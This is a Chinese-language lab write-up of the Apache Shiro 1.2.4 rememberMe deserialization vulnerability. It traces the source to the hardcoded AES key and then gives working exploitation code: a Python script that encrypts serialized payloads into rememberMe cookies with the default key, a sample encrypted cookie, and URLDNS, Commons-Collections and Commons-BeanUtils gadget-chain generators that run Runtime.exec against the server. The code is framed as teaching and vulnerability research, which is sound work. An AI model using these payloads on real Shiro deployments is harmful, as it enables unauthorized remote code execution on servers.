# 环境搭建

注意：

- shiro550 里使用的是 `shiro <1.2.4`

导入的是  https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4  里的 `samples` 目录，导入 `pom.xml` ,再配置 tomcat，debug运行即可

接着 pom.xml 里加一个解析 jsp 的包

```xml
<dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
            <scope>runtime</scope>
        </dependency>
```

后续测什么依赖则导入对应的坐标，注意实际上生产环境里 shiro 里是没有 CC 包的

再注意 maven 里点击 `download sources` 即可以在 jar 包里看到 java 代码而不是 class 文件

# 漏洞分析

## 登录框发现

勾选 `Remember Me` 登录后

<img src=".\图片\Snipaste_2023-05-27_13-01-15.png" alt="Snipaste_2023-05-27_13-01-15" style="zoom:80%;" />

Cookie 里有一个 rememberMe 的字段，其内容很神秘，像是 base64 或者 AES 加密之类的

<img src=".\图片\Snipaste_2023-05-27_13-03-17.png" alt="Snipaste_2023-05-27_13-03-17" style="zoom:80%;" />

于是接下来去源码查看这个 Cookie 的由来

## 源码分析

### CookieRememberMeManager.java

搜索关键词 `Cookie` 发现 maven 依赖里有 `org/apache/shiro/web/mgt/CookieRememberMeManager.java`

<img src=".\图片\Snipaste_2023-05-27_13-14-07.png" alt="Snipaste_2023-05-27_13-14-07" style="zoom:67%;" />

找到 `getRememberedSerializedIdentity()` 方法，发现它在 base64 解码 Cookie 内容，接着找谁调用了这个方法

```java
protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

        if (!WebUtils.isHttp(subjectContext)) {
            if (log.isDebugEnabled()) {
                String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                        "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                        "immediately and ignoring rememberMe operation.";
                log.debug(msg);
            }
            return null;
        }

        WebSubjectContext wsc = (WebSubjectContext) subjectContext;
        if (isIdentityRemoved(wsc)) {
            return null;
        }

        HttpServletRequest request = WebUtils.getHttpRequest(wsc);
        HttpServletResponse response = WebUtils.getHttpResponse(wsc);

        String base64 = getCookie().readValue(request, response); // 接受 Cookie
        // Browsers do not always remove cookies immediately (SHIRO-183)
        // ignore cookies that are scheduled for removal
        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

        if (base64 != null) {
            base64 = ensurePadding(base64);
            if (log.isTraceEnabled()) {
                log.trace("Acquired Base64 encoded identity [" + base64 + "]");
            }
            byte[] decoded = Base64.decode(base64); //base64解码
            if (log.isTraceEnabled()) {
                log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
            }
            return decoded;
        } else {
            //no cookie set - new site visitor?
            return null;
        }
    }
```

### AbstractRememberMeManager.java

找到 `org/apache/shiro/mgt/AbstractRememberMeManager.java` 里的 `getRememberedPrincipals()` 方法调用了 `CookieRememberMeManager.java`  里的 `getRememberedSerializedIdentity() ` 方法

```java
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);// 返回了 bytes
            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);//bytes作为参数调用
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }

        return principals;
    }
```

再跟进 `convertBytesToPrincipals()` 方法里，`decrypt()` 方法又 处理了 `bytes`

```java
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);//
        }
        return deserialize(bytes);
    }
```

### 1、跟进decrypt()

跟进 `decrypt()` 方法里，查看到了 `getDecryptionCipherKey()`

```java
protected byte[] decrypt(byte[] encrypted) {
        byte[] serialized = encrypted;
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
            serialized = byteSource.getBytes();
        }
        return serialized;
    }
```

继续跟进 `getDecryptionCipherKey()`

```java
public byte[] getDecryptionCipherKey() {
        return decryptionCipherKey;
    }
```

继续看 `decryptionCipherKey` 是什么

```java
private byte[] decryptionCipherKey;
```

点击跟进 `decryptionCipherKey` 是⼀个私有字段，寻找赋值的地⽅

```java
public void setEncryptionCipherKey(byte[] encryptionCipherKey) {
        this.encryptionCipherKey = encryptionCipherKey;
    }
```

寻找 `setEncryptionCipherKey()` 方法被谁调⽤

```java
public void setCipherKey(byte[] cipherKey) {
        //Since this method should only be used in symmetric ciphers
        //(where the enc and dec keys are the same), set it on both:
        setEncryptionCipherKey(cipherKey);
        setDecryptionCipherKey(cipherKey);
    }
```

接着寻找 `setCipherKey()` 方法被谁调⽤

```java
public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer<PrincipalCollection>();
        this.cipherService = new AesCipherService();
        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
    }
```

继续查看 `DEFAULT_CIPHER_KEY_BYTES` ，发现是个常量

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

### 2、跟进deserialize

再回到 `convertBytesToPrincipals()` 方法里，查看 `deserialize()` 方法

```java
protected PrincipalCollection deserialize(byte[] serializedIdentity) {
        return getSerializer().deserialize(serializedIdentity);
    }
```

发现 deserialize 是一个 `org/apache/shiro/io/Serializer.java` 里的接口

```java
 deserialize(byte[] serialized) throws SerializationException;
```

查看其的实现，找到 `org/apache/shiro/io/DefaultSerializer.java`，找到 `readObject()` 方法

```java
public T deserialize(byte[] serialized) throws SerializationException {
    if (serialized == null) {
        String msg = "argument cannot be null.";
        throw new IllegalArgumentException(msg);
    }
    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
    BufferedInputStream bis = new BufferedInputStream(bais);
    try {
        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
        @SuppressWarnings({"unchecked"})
        T deserialized = (T) ois.readObject();//反序列化入口
        ois.close();
        return deserialized;
    } catch (Exception e) {
        String msg = "Unable to deserialze argument byte array.";
        throw new SerializationException(msg, e);
    }
}
```

## 总结

shiro默认使⽤了CookieRememberMeManager，

其处理cookie的流程是： 

```
得到rememberMe的cookie值 --> Base64解码 --> AES解密 --> 反序列化 
```

然⽽AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。 p

ayload 构造的顺序则就是相对的反着来： 

```
恶意命令-->序列化-->AES加密-->base64编码-->发送cookie 
```

在整个漏洞利⽤过程中，⽐较重要的是AES加密的密钥，该秘钥默认是默认硬编码的，所以如果没有修 改默认的密钥，就⾃⼰可以⽣成恶意构造的cookie了。

shiro特征： 

- 未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie⾥也没有deleteMe字段 登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段 
- 不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段。但是 之后的所有请求中Cookie都不会有rememberMe字段 
- 勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段，还会 有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段

# 利用

## URLDNS测试

burp 的 dnslog平台

```
uuskbdhokjpvvmulydjo9unt5kbbz0.burpcollaborator.net
```

生成urldns链：

```java
package com.zf1yolo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class Urldns {
    public static void main(String[] args) throws Exception {
                /*
        利用链:
            ObjectInputStream#readObject() -> HashMap.readObject(ObjectInputStream in)
            HashMap -> hash()
            URL -> hashCode()
            URLStreamHandler -> hashCode()
            URLStreamHandler -> getHostAddress()
            URL -> getHostAddress()
            InetAddress -> getByName()
         */
        HashMap hashMap = new HashMap();
        URL url = new URL("http://y98oqhwszn4zaq9pdhysoy2xkoqge5.burpcollaborator.net");

        /*
        URL：
            private int hashCode = -1;

            public synchronized int hashCode() {
                if (hashCode != -1)
                    return hashCode;
                hashCode = handler.hashCode(this);
                return hashCode;
            }

        HashMap.put()和本利用链都会执行至URL.hashCode()
        */
        Field hashCodeField = url.getClass().getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);

        // 阻止创建payload时触发请求
        hashCodeField.set(url, 0);
        hashMap.put(url, null);
        // 使利用链执行时能够触发请求
        hashCodeField.set(url, -1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("ser.bin")));
        oos.writeObject(hashMap);
        oos.close();
    }
}
```

shiro_exp.py 加密编码：

```python
import sys

import uuid

import base64

import subprocess

from Crypto.Cipher import AES

def get_file(name):

    with open(name,'rb') as f:

        data = f.read()

    return data

def en_aes(data):

    BS = AES.block_size

    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()

    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

    iv = uuid.uuid4().bytes

    encryptor = AES.new(key, AES.MODE_CBC, iv)

    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))

    return base64_ciphertext

if __name__ == '__main__':

    data = get_file("ser.bin")

    print(en_aes(data))
```

生成payload

```
nTGsB655QJCuFHFsVoV2zLgESzpUlR/L6QBU77NZ+RedyPWgHwgTBKZ68C8axJ31ClnJqwCdY1sytynGw9mOQxVqeNbfoiK1l3lvSGPJ/x0hkCxCJD3EMhx1huBla4MP+4aZ++74EKUgr0z2wG8y2i80wKmnOqOdXQisnsyxxo5C7+dJnt3pJpBkOu2KqtRDZ4JPbJw/bXTskBzMJlpz/YFneSb3uf19ARFn2wBBqZfMy8eVCjeAic1R8oUAee3uBTBC9G3SNw2HO3Qrs7mWDK1w3Pb2xd0dvcLtJQVK+DdzLlfmqcmH8JtR+ZwMj4eYnra7tL8IF70CnSJX4rucVsbvlJxFHF+17F2lefNJebS/dKSImCVjqA+SoLzDTvP74El89CsquWDxdKryLiVHKZm8kpll5Ru6ykAWJF0jufA=
```

burp抓包里的`Cookie`里去掉`JSESSIONID`（因为没有JSESSIONID才会读取rememberMe），替换 `rememberMe` 的值，发包则触发到dnslog

<img src=".\图片\Snipaste_2023-05-27_14-22-20.png" alt="Snipaste_2023-05-27_14-22-20" style="zoom: 80%;" />

## CC链

由于Shrio对resolveClass进⾏了修改，导致数组类⽆法加载，因此原⽣的cc链是⽆法直接使⽤的

```java
package com.zf1yolo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, NotFoundException, CannotCompileException, ClassNotFoundException {
// 通过字节码构建恶意类
        ClassPool classPool= ClassPool.getDefault();
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections3");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes=payload.toBytecode();
//CC3
        TemplatesImpl templates = new TemplatesImpl();
        //  TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();
        Field nameField = aClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaaa");
        Field bytecodesField = aClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,new byte[][]{bytes});
//CC2
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
//CC6
        HashMap<Object, Object> map = new HashMap<Object, Object>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
        HashMap<Object, Object> map2 = new HashMap<Object, Object>();
        map2.put(tiedMapEntry,"bbb");
        lazyMap.remove(templates);
        Class<LazyMap> c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,invokerTransformer);
        serialize(map2);
    }
    public static void serialize(Object obj) throws IOException, ClassNotFoundException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        //unserialize("test.out");
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object object = objectInputStream.readObject();
        return object;
    }
}
```

<img src=".\图片\Snipaste_2023-05-27_14-42-56.png" alt="Snipaste_2023-05-27_14-42-56" style="zoom:67%;" />

## CB链

⽆依赖利⽤链

```java
package com.zf1yolo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cb {

    // 修改值的方法，简化代码

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{

        Field field = object.getClass().getDeclaredField(fieldName);

        field.setAccessible(true);

        field.set(object, value);

    }

    public static void main(String[] args) throws Exception {

        // 创建恶意类，用于报错抛出调用链

        ClassPool pool = ClassPool.getDefault();

        CtClass payload = pool.makeClass("EvilClass");

        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");

        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] evilClass = payload.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();

        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});

        setFieldValue(templates, "_name", "test");

        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

        queue.add("1");

        queue.add("1");

        setFieldValue(beanComparator, "property", "outputProperties");

        setFieldValue(queue, "queue", new Object[]{templates, templates});

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("ser.bin"));

        out.writeObject(queue);

//        ObjectInputStream in = new ObjectInputStream(ne FileInputStream("ser.bin"));
//
//        in.readObject();

    }

}
```
